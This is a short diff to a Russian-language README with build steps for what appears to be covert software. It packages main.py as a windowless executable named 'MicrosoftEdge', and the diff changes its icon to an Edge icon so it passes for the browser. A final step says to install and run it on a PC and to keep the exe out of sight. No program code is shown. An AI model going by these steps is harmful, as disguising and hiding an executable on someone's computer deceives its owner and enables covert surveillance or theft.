@@ -38,7 +38,7 @@ pip install -r requirements.txt
 
 ## 5. Собери exe файл
 ```bash
-pyinstaller --onefile --noconsole --icon=googlechrome.ico --name=MicrosoftEdge main.py
+pyinstaller --onefile --noconsole --icon=edgebrowser.ico --name=MicrosoftEdge main.py
 ```   
 
 ### 6. Дальше просто устанавливаешь этот exe на ~~любой ПК~~ и запускаешь, желательно exe файл не оставлять на видном месте
